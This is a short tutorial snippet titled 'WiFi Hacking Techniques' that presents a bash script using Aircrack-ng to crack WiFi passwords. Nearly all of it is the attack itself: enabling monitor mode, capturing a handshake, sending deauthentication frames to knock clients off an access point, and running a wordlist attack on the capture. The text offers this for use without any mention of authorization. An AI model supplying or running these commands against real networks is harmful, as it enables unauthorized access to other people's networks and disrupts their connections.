WiFi Hacking Techniques (using Aircrack-ng for Password Cracking)
To crack WiFi passwords using Aircrack-ng, here is a script that demonstrates password cracking on a captured handshake file.


#!/bin/bash
# WiFi password cracking script using Aircrack-ng

# Capture a handshake
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --bssid [AP BSSID] -c [Channel] -w capture

# Deauthenticate to capture handshake
sudo aireplay-ng --deauth 10 -a [AP BSSID] wlan0mon

# Crack the password with a wordlist
sudo aircrack-ng -w /path/to/wordlist.txt -b [AP BSSID] capture*.cap

Note: Replace [AP BSSID], [Channel], and /path/to/wordlist.txt with actual values.
